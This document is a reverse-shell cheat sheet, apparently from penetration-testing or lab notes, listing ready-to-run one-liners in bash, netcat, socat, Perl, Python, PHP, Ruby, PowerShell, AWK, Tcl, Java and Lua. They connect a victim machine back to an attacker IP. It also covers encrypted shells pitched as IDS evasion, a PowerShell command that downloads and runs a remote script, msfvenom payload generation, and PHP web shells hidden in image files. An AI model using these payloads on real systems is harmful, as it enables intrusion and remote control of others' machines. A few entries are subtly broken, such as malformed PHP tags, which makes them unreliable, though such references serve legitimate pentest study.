# Reverse Shells

### Reverse Shells

- [Bash TCP](#basht)
- [Bash UDP](#bashu)
- [Netcat](#nc)
- [NCat](#ncat)
- [Telnet](#tn)
- [Socat](#scat)
- [Perl](#perl)
- [Python](#py)
- [PHP](#php)
- [Ruby](#rb)
- [Secure Reverse Shell](#ssl)
- [Powershell](#ps)
- [AWK](#awk)
- [TCLsh](#tsh)
- [Java](#java)
- [Lua](#lua)
- [MSF Reverse Shell](#msf)
- [XTerm](#xt)
- [Magic Bytes](#image)

#### Bash TCP <a name='basht'></a>
```bash
# on the victim machine
# 1.syntax: bash -i >& /dev/tcp/{attacker IP}/{port} 0>&1
bash -i >& /dev/tcp/10.10.14.32/1337 0>&1

# 2.syntax: /bin/bash/ -i > dev/tcp/{attacker IP}/{port} 0<& 2>&1
/bin/bash -i > /dev/tcp/10.10.14.32/1337 0<& 2>&1

# 3.syntax: exec 5<>/dev/tcp/{attacker IP}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done
exec 5<>/dev/tcp/10.10.14.32/1337;cat <&5 | while read line; do $line 2>&5 >&5; done

# 4.syntax: exec /bin/sh 0</dev/tcp/{attacker IP}/{port} 1>&0 2>&0
exec /bin/sh 0</dev/tcp/10.10.14.32/1337 1>&0 2>&0

# 5.syntax: 0<&196;exec 196<>/dev/tcp/{attacker IP}/{port}; sh <&196 >&196 2>&196
0<&196;exec 196<>/dev/tcp/10.10.14.32/1337; sh <&196 >&196 2>&196

# on attacker machine
# syntax: nc -lvnp {port}
nc -lvnp 1337
```

#### Bash UDP <a name='bashu'></a>
```bash 
# on the victim machine
# syntax: sh -i >& /dev/udp/{attacker IP}/{port} 0>&1
sh -i >& /dev/udp/10.10.14.32/1337 0>&1

# on attacker machine
# syntax: nc -u -lvp {port}
nc -u -lvp 1337
```

#### NetCat <a name='nc'></a>
```bash
# 1.syntax: nc -e /bin/sh {attacker IP} {port}
nc -e /bin/bash 10.10.14.32 1337

# 2.syntax: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker IP} {port} >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.32 1337 >/tmp/f

# 3.syntax: mknod backpipe p && nc {attacker IP} {port} 0<backpipe | /bin/bash 1>backpipe
mknod backpipe p && nc 10.10.14.32 1337 0<backpipe | /bin/bash 1>backpipe

# on the attacker machine
# syntax: nc -lvnp {port}
nc -lvnp 1337 
```

#### NCat <a name='ncat'></a>
```bash
# on the victim machine
# 1.TCP Syntax: ncat {attacker IP} {port} -e /bin/bash
ncat 10.10.14.32 1337 -e /bin/bash

# 2.UDP Syntax: ncat --udp {attacker IP} {port} -e /bin/bash
ncat --udp 10.10.14.32 1337 -e /bin/bash

# on the attacker machine
# 1.TCP Listen syntax: ncat -l {port}
ncat -l 1337

# 2.UDP Listen syntax: ncat -u {port}
ncat -u 1337
```

#### Telnet <a name='tn'></a>
```bash
# on the victim machine
# 1.syntax: rm -f /tmp/p; mknod /tmp/p p && telnet {attacker IP} {port} 0/tmp/p 2>&1
rm -f /tmp/p; mknod /tmp/p p && telnet 10.10.14.32 1337 0/tmp/p 2>&1

# 2.syntax: telnet {attacker IP} {port1} | /bin/bash | telnet {attacker IP} {port2}
telnet 10.10.14.32 1337 | /bin/bash | telnet 10.10.14.32 1338

# 3.syntax: rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet {attacker IP} {port} > f
rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet 10.10.14.32 1337 > f

# on the attacker machine
# 1.syntax: nc -lvnp {port}
nc -lvnp 1337

# 2.syntax: nc -lvnp {port1}; nc -lvnp {port 2}
nc -lvnp 1337
nc -lvnp 1338
```

#### Socat <a name='scat'></a>
```bash
# on the attacker machine
# syntax: socat file:`tty`,raw,echo=0 TCP-L:{port}
socat file:`tty`,raw,echo=0 TCP-L:1337

# on the victm machine
# 1.syntax: ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{attacker IP}:{port}
./socat tcp:<attacker-ip>:<attacker-port> exec:'bash -li',pty,stderr,setsid,sigint,sane 

# 2.syntax: socat tcp-connect:{attacker IP}:{port} exec:"bash -li",pty,stderr,setsid,sigint,sane
socat tcp-connect:10.10.14.32:1337 exec:"bash -li",pty,stderr,setsid,sigint,sane

# 3.Oneliner syntax: wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{attacker IP}:{port}
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.32:1337

#============================================================================#
# simple reverese shell
# on the compromised machine
socat TCP-L:<port> EXEC=/bin/bash # execute /bin/bash on conenction

# on the attacker machine
socat TCP:<compromised-machine-ip>:<opened-port> - 

# 


# Pivoting with socat
# machine we want to access (Machine A)
socat TCP-L:1234 EXEC:/bin/bash

# machine we have access to (pivot point- Machine B)
socat TCP-L:3333 TCP:<Machine-A IP>:1234 

# attacker machine  (our machine)
socat TCP:<Machine-B IP>:3333 - 

# encrypted reverse shells will prevent anyone from spying and used to evade IDS

# On the attacker machine
## Generate a certificate
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.cert 
# on creating values will be asked which can be left blank
# shell.key and shell.cert will be generated
# merge the key and cert file to generate a pam file
cat shell.key shell.crt > shell.pem
# the generated certificate must be used on whichever device is listening for the connection
socat openssl-listen:4444,cert=shell.pem,verify=0 -

# on the victim machine
socat openssl-connect:<attacker-ip>:4444,verify=0 EXEC:/bin/bash

# poor interactive shell will be obtained

```bash
# compromized machine
┌───[toor@parrot]─[/dev/shm]  
└──╼ $socat openssl-listen:1234,cert=shell.pem,verify=0 exec:/bin/bash
```

```bash
# attackker machine  
┌────[kali@kali]─[/opt/binaries]
└──╼ $socat openssl-connect:192.168.43.181:1234,verify=0 -
id
uid=1000(toor) gid=1000(toor) groups=1000(toor)


# =================================================================================================#
# fully interactive encrypted shell
# on the attacker machine
socat `tty`,raw,echo=0 openssl-listen:1234,cert=shell.pem,verify=0

# on the victim machine
socat openssl-connect:<attacker-ip>:1234,verify=0 exec:bash,pty,stderr,setsid
```

#### Perl <a name='perl'></a>
```bash 
# on the victim machine
# 1.syntax: perl -e 'use Socket;$i="{attacker IP}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -e 'use Socket;$i="10.10.14.32";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# 2.syntax: perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{attacker IP}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.32:1337");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

# 3. Works only on windows machine: perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{attacker IP}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.14.32:1337");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

# on the attacker machine 
# syntax: nc -lvnp {port}
nc -lvnp 1337

```

#### Python <a name='py'></a>
```bash
# on the victim machine
# IPv4 Connection: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker IP}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.32",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# IPv6 Connection: python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("{IPv6 attacker IP}",{port},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",1337,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'

# on the attacker machine
# 1.syntax: nc -lvnp {port}
nc -lvnp 1337

# 2.IPv6 Connection Listenting: wget http://ftp.cn.debian.org/debian/pool/main/n/nc6/netcat6_1.0-8_amd64.deb; dpkg -i ./netcat6_1.0-8_amd64.deb; netcat -6 -l {port}  
wget http://ftp.cn.debian.org/debian/pool/main/n/nc6/netcat6_1.0-8_amd64.deb; dpkg -i ./netcat6_1.0-8_amd64.deb; netcat -6 -l 1337
```

#### PHP <a name='php'></a>
```bash
# on the victim machine
# 1.syntax: php -r '$sock=fsockopen("{attacker IP}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.10.14.32",1337);exec("/bin/sh -i <&3 >&3 2>&3");'

# 2.syntax: php -r '$s=fsockopen("{attacker IP}",{port});$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'
php -r '$s=fsockopen("10.10.14.32",1337);$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'

# 3.Syntax: <?php system($_GET['wr3nch']); ?>
<php system($_GET['wr3nch']); >

# on the attacker machine
# syntax: nc -lvnp {port}
nc -lvnp 1337
```

#### Ruby <a name='rb'></a>
```bash
# on the victim machine
# 1.syntax: ruby -rsocket -e'f=TCPSocket.open("{attacker IP}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e'f=TCPSocket.open("10.10.14.32",1337).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# 2.Windows Only Syntax: ruby -rsocket -e 'c=TCPSocket.new("{attacker IP}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
ruby -rsocket -e 'c=TCPSocket.new("10.10.14.32","1337");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# on the attacker machine
# syntax: nc -lvnp {port}
nc -lvnp 1337
```

#### Secure Reverse Shell <a name='ssl'></a>
```bash
# on the victim machine
# syntax: mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {attacker IP}:{port} > /tmp/s; rm /tmp/s
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.32:1337 > /tmp/s; rm /tmp/s

# on the attacker machine
# Generating ssl cert and key
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
# configuring on the specified port and listenting
# syntax: openssl s_server -quiet -key key.pem -cert cert.pem -port {port}
openssl s_server -quiet -key key.pem -cert cert.pem -port 1337
# or ncat instance 
# syntax: ncat --ssl -vv -l -p {port}
ncat --ssl -vv -l -p 1337
```

#### Powershell <a name='ps'></a>
```bash
# on the victim machine
# 1.syntax: powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{attacker IP}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.32",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# 2.Syntax: powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{attacker IP}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.32',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# 3. Modify the IP in this file and replace share it to the victim
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')

# on the attacker machine
# syntax: nc -lvnp {port}
nc -lvnp 1337
```

#### AWK <a name='awk'></a>
```bash
# on the victim machine
# syntax: awk 'BEGIN {s = "/inet/tcp/0/{attacker IP}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
awk 'BEGIN {s = "/inet/tcp/0/10.10.14.32/1337"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

# on the attacker machine
# syntax: nc -lvnp {port}
nc -lvnp 1337
```

#### TCLsh <a name='tsh'></a>
```bash
# on the victim machine
# syntax: echo 'set s [socket {attacker IP} {port}];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
echo 'set s [socket 10.10.14.32 1337];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh

# on the attacker machine
# syntax: nc -lvnp {port}
nc -lvnp 1337
```

#### Java <a name='java'></a>
```bash
# on the victim machine
# syntax: r = Runtime.getRuntime()
# p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{attacker IP}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
# p.waitFor()
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.32/1337;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

# on the attacker machine
# syntax: nc -lvnp {port}
nc -lvnp 1337
```

#### Lua <a name='lua'></a>
```bash
# on the victim machine
# 1.Only On Linux syntax: lua -e "require('socket');require('os');t=socket.tcp();t:connect('{attacker IP}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.14.32','1337');os.execute('/bin/sh -i <&3 >&3 2>&3');"

# 2.On Both linux and windows:lua5.1 -e 'local host, port = "{attacker IP}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' 
lua5.1 -e 'local host, port = "10.10.14.32", 1337 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'

# on the attacker machine
# syntax: nc -lvnp {port}
nc -lvnp 1337
```

#### MSF Reverse Shell<a name='msf'></a>
```bash
# on the attacker machine to generate files which will yield shell rather than msf session
# transfer the generated file to the victim machine in order to obtain the shell, change the IP and Port 

# war file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.32 LPORT=1337 -f war > reverse.war

# exe file
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.32 LPORT=1337 -f exe > reverse.exe

# elf file
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.32 LPORT=1337 -f elf >reverse.elf

# macho file
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.32 LPORT=1337 -f elf >reverse.elf

# aspx file
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.32 LPORT=1337 -f aspx > exploit.aspx

# jsp file
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.14.32" LPORT=1337 -f raw > shell.jsp

# python file
msfvenom -p cmd/unix/reverse_python LHOST="10.10.14.32" LPORT=1337 -f raw > shell.py

# sh file
msfvenom -p cmd/unix/reverse_bash LHOST="10.10.14.32" LPORT=1337 -f raw > shell.sh

# perl file
msfvenom -p cmd/unix/reverse_perl LHOST="10.10.14.32" LPORT=1337 -f raw > shell.pl

# after transferring
# on the attacker machine
# syntax: nc -lvnp {port}
nc -lvnp 1337
```

#### XTerm <a name='xt'></a>
```bash
# on the victim machine
xterm -display 10.10.14.32:1
Xnest :1
xhost +targetip

# on the attacker machine 
nc -lvnp 6001
```

#### Magic Bytes reverse shell <a name='image'></a>
```bash
# Using magic bytes
echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg
echo '<?=`$_GET[wr3nch]`?>' >> webshell.php.jpg

# Using exiftool
exiftool -comment='<?php system($_GET['wr3nch']);?>' \<file_name\>.\<extension\>

# normal php executables
<php echo exec('whoami');?>
<php system("whoami"); ?>
<php system($_REQUEST['wr3nch']); #	works with the post verb
<php system($_GET['wr3nch']); >

```

##### References:
- The reverse shells are composed in a place taken from [here](https://krober.biz/misc/reverse_shell)
- Some points are reffered form [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- Php reverse shell bt [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)
